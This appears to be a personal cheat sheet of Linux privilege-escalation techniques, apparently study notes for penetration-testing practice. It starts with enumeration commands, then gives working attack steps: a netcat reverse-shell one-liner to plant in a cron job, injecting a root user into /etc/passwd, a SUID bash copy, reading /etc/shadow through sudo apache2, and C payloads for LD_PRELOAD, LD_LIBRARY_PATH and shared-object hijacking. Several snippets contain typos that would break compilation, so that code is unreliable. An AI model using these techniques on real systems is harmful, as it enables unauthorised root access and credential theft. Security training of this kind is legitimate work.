##### Basic Privilege Escalation Enumeration

###### Basic Privesc Enumeration for Linux
```
whoami /priv
whoami // Privileges info
---
id
---
cat /etc/passwd // Discover other users
---
hostname
---
cat /etc/issue // OS
--- 
cat /etc/*-release // OS + More info
---
uname -a // Exact Package
---
ps aux // Processes
---
ifconfig
---
ip a // ifconfig
---
/sbin/route // Network map / Could be routel depending on distro
---
ss -anp // Active network connections
```
###### Enumerating Firewalls for Linux
Need root for iptables but...
```
cat /etc/iptables // Check for this 
---
cat /etc/iptables-backup
---
cat /etc/iptables | grep 'iptables-save' // iptables-restore
```
###### Enumerating Scheduled Tasks for Linux
```
ls -lah /etc/cron* //List Tasks
---
cat /etc/crontab // Inspect Carfully 
```
###### Enumerating installed applications for Linux
```
dpkg -l | grep -i APP(ie.pam)

---
```
###### Enumerating R/W files for Linux
```
find / -writable -type d 2>/dev/null
---
```
###### Enumerating Unmounted Disks for Linux
```
mount // Show mounts
---
cat /etc/fstab // Check Mounting configs
---
/bin/lsblk  // View all available disks 
---
```
###### Enumerating Drivers and Kernal Modules for Linux
```
lsmod
---
s/sbin
---
/sbin/modinfo <module> //How to view modules
```
###### SUID for Linux
```
find / -perm -u=s -type f 2>/dev/null
```
###### Find files and groups
```
find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null|column -t
```
###### Linux PrivEsc Exploitation
```
./unix-privesc-check // http://pentestmonkey.net/tools/unix-privesc-check
---
./unix-privesc-check standard
---
./unix-privesc-check detailed 
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP><PORT> >/tmp/f" // write this to a file in a cronjob
---
```
Injecting a superuser into /etc/passwd
```
openssl passwd <newpassword> // Populate password hash

echo "<NEW USERNAME>:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd // add user to passwd
- 
su <new username> // rooted ;)
```
Try copy /bin/bash to spawn a root shell

```
cp /bin/bash rootbash

Make sure it is owned by root user and has the SUID bit set

./rootbash -p 

```
Create a custom exe
```
int main() {
  setuid(0);
  system("/bin/bash -p");
 }
 
 Compile with gcc -o shellin shellin.c
 
 ```
Service Exploits
```
Find program versions owned by root:
---------------------
ps aux | grep root
<program> --version
<program> -v
dpkg -i | grep <program>
rpm -qa | grep <program>
---------------------
Check for services hosted on local network for portforward attack
--
netstat -l
```
Weak file permissions
```
/tmp
/
/var/backups
```
sudo
```
sudo <program>
sudo -u <user> <program>
sudo -l 

sudo su 
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```
Shell Escape Seq
```
GTFOBINS
--------
```
Using apache2 to read root password
```
sudo apache2 -f /etc/shadow 
```
Enviroment variable sudo PRELOAD
```
sudo -l
vim preload.c
---

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0,);
  system("/bin/bash -p");
}
---
gcc -fPIC -sahred -nostartfiles -o /timp/preload.so preload.c
---
sudo LD_PRELOAD=/tmp/preload.so find 
```
LD_LIBRARY_PATH
```
ldd /usr/sbin/apache2

(Will replace crypt shared object)
---
library_path.c 

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("|/bin/bash -p");
}
    
---
gcc -o libcrypt.so.1 0sgared -fPIC library_path.c
sudo LD_LIBRARY_PATH=. apache2
```
CronJobs
```
/var/spool/cron/
/var/spool/cron/crontabs/
/etc/crontab

Check for writable jobs,
add reverse shell to a writeable job

wait for the cron job to pop shell
---
```
SUID/SGID
Check to see if exim is exploitable
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Shared Object Injection
```
/usr/local/bin/suid-so

(see whats happening when you execute)
strace /usr/local/bin/suid-so

(grep some stuff)
strace /usr/local/bin/suid-so | grep -iE "open|access|no such file"

mkdir .config
cd .config
vim <shared object file> i.e libcalc.c

[libcalc.c]
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject()
  setuid(0);
  system("/bin/bash -p")
}

gcc -shared -fPIC -o libcalc.so libcalc.c

/usr/local/bin/suid.so 

------





```
A list of tools
```
RSG - Reverse shell generator, github. (Check it out if you are really stuck)
LinEnum.sh
Linux Smart Enumeration (lse.sh)
LinPeas.sh
Linuxprivchecker
BeRoot
unix-privesc-check
linux-exploit-suggester (for KE)
```



